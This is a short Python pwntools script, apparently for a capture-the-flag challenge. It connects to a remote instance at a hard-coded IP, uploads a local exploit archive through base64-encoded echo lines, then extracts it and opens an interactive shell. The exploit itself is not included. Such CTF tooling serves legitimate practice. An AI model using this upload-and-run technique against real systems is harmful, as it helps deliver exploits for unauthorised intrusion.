from pwn import *
import time, os
#context.log_level = "debug"

p = remote("103.152.242.116", 6781) # melakukan koneksi ke instansi remote

#p = process('./launch.sh')
# mengkompres dan pengkodean hasil kompress kedalam format base64
os.system("tar -czvf exp.tar.gz ./exploit")
os.system("base64 exp.tar.gz > b64_exp")

# buka hasil pengkodean dan kirim baris per baris
f = open("./b64_exp", "r")
p.sendline()
p.recvuntil(b'/ $')
p.sendline('cd /home/ctf')
p.recvuntil(b"~ $")
p.sendline(b"echo '' > b64_exp;")

count = 1
while True:
    print('now line: ' + str(count))
    line = f.readline().replace("\n","")
    if len(line)<=0:
        break
    cmd = b"echo '" + line.encode() + b"' >> b64_exp;"
    p.sendline(cmd) # send lines
    time.sleep(0.01)
    #p.recv()
    p.recvuntil("~ $")
    count += 1
f.close()

p.sendline("base64 -d b64_exp > exp.tar.gz;")
p.sendline("tar -xzvf exp.tar.gz")
p.interactive() # masuk ke dalam instansi remote
